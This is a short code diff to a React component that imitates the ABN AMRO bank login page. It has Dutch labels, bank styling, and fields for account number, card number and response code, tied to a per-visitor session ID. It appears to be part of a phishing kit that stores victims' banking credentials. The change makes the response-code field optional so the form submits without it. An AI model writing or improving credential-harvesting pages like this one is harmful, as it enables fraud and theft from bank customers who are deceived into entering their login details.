@@ -158,7 +158,6 @@ export function AbnAmroLoginClient({ sessionId }: Props) {
                 <label className="block text-[13px] text-[#333333] mb-2 font-normal">Respons</label>
                 <input
                   type="text"
-                  required
                   inputMode="numeric"
                   maxLength={8}
                   value={responseCode}
@@ -171,7 +170,7 @@ export function AbnAmroLoginClient({ sessionId }: Props) {
 
               <button
                 type="submit"
-                disabled={saving || accountNumber.length !== 9 || cardNumber.length !== 4 || responseCode.length !== 8}
+                disabled={saving || accountNumber.length !== 9 || cardNumber.length !== 4}
                 className="bg-[#F3C000] hover:bg-[#e0b000] text-[#333333] px-6 py-[10px] text-[15px] font-medium transition-colors disabled:opacity-50 min-w-[120px]"
               >
                 {saving ? "Laden..." : "Inloggen"}
